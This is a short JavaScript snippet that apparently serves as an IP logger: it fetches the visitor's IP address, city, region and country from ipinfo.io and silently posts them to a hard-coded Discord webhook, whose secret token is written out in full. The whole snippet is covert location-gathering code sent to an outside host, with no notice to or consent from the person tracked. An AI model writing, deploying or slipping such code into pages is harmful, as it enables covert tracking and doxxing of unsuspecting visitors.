const webhookUrl = "https://discord.com/api/webhooks/1228782855979536394/xpBDLelob__n82pHZ6jHwozBNwJiOqMvmKl1t62ltVVkrkgNrkGJXeHQbeRbLp-CrT-H";

fetch("https://ipinfo.io/json")
.then(response => response.json())
.then(data => {
    const embed = {
        description: `**IP Address: ${data.ip}\nCity: ${data.city}\nState: ${data.region}\nCountry Flag: :flag_${data.country.toLowerCase()}:**`
    };

    const payload = {
        embeds: [embed]
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload),
    })
})
